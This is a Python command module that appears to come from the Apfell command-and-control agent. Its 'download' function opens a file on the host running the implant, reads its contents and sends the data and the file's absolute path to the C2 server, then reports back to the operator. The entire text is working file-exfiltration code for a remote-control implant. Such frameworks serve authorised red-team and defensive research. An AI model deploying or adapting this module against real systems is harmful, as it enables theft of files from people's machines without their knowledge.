def download(apfell, c2, params="", task_id=""):
    import json
    import os
    try:
        file = open(params, 'rb')
    except Exception as e:
        output = json.dumps({"user_output": "Failed to open file: {}".format(str(e)), "status": "error","completed": True})
        c2.post_response(response=output, task_id=task_id)
        apfell.remove_job(task_id)
        return
    try:
        data = file.read()
        path = os.path.abspath(params)
        c2.download(task_id=task_id, data=data, path=path)
        output = json.dumps({"user_output": "Finished downloading", "completed": True})
        c2.post_response(response=output, task_id=task_id)
    except Exception as e:
        output = json.dumps({"user_output": "Failed to send file: {}".format(str(e)), "completed": True, "status": "error"})
        c2.post_response(response=output, task_id=task_id)
    apfell.remove_job(task_id)
    return
COMMAND_ENDS_HERE